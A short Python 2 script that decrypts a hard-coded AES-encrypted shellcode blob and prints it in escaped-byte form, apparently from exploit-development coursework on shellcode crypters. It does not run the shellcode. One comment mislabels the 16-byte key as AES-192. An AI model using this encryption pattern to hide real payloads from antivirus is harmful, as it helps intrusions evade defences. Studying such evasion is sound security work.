#!/usr/bin/python

#Filename: aes_shellcode_decipher.py 
#Author:  MrSquid
#Purpose: Aes shellcode decipher

from Crypto.Cipher import AES
import base64

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
unpad = lambda s : s[0:-ord(s[-1])]


def decipher_message(key, ciphertext, iv): #Decipher function	
	ciphertext = ciphertext.decode("hex") #Decode ciphertext from hex
	key = base64.b64decode(key) #Key is in base64
	obj2 = AES.new(key, AES.MODE_CBC, iv) #AES function (CBC Mode)
	decipher_text = obj2.decrypt(ciphertext) #Decrypt ciphertext
	decipher_text = unpad(decipher_text) #Erase padding
	return decipher_text

def main():
	iv= "166fe2294df5d0f3" #Initialization vector
	key= "N2FlMjE4ZmYyOTI4ZjZiMg==" #Base64 Key, it must be 24 due to is AES-192
	cipher_shell = "\xca\xb5\x85\xf2\xdd\xa7\x85\x19\x8a\xfe\x1b\x7d\xbb\x02\xd7\x7a\x3c\x1e\x74\x8e\x1e\xe3\x22\x5c\x8f\x22\x36\x26\x30\xa1\x6c\xc1\x8b\xcd\x1a\x60\xd8\xd6\xe7\x10\xf1\x8b\x0c\x38\x77\x85\x25\x74\xe0\x04\xbe\xe4\x7a\x57\x0d\x09\xc6\xa5\xda\x41\xf6\x9e\xa8\xc0\x8b\x69\x9f\x38\xa3\x17\xec\x52\x21\x3b\x9c\x74\x5a\xf4\x8a\x4c"
	#Cipher shell is the shellcode ciphered by AES	
	shellcode = ""	
	for x in bytearray(cipher_shell): #Cipher shell converted to string (\x is erased)
		shellcode += '%02x' % x
	decipher_shellcode = decipher_message(key,shellcode,iv) #Decipher shell is saved in decipher_shellcode
	byte_shell = "" 
	counter = 0
	var = ""
	for x in decipher_shellcode: #Printing to the user the shellcode as bytes (\x** format)
		var += x
		counter += 1
		if counter == 3:
			byte_shell += "\\"
			byte_shell += var
			var = ""
			counter = 0
	return byte_shell 

if __name__ == "__main__":
	print main()	

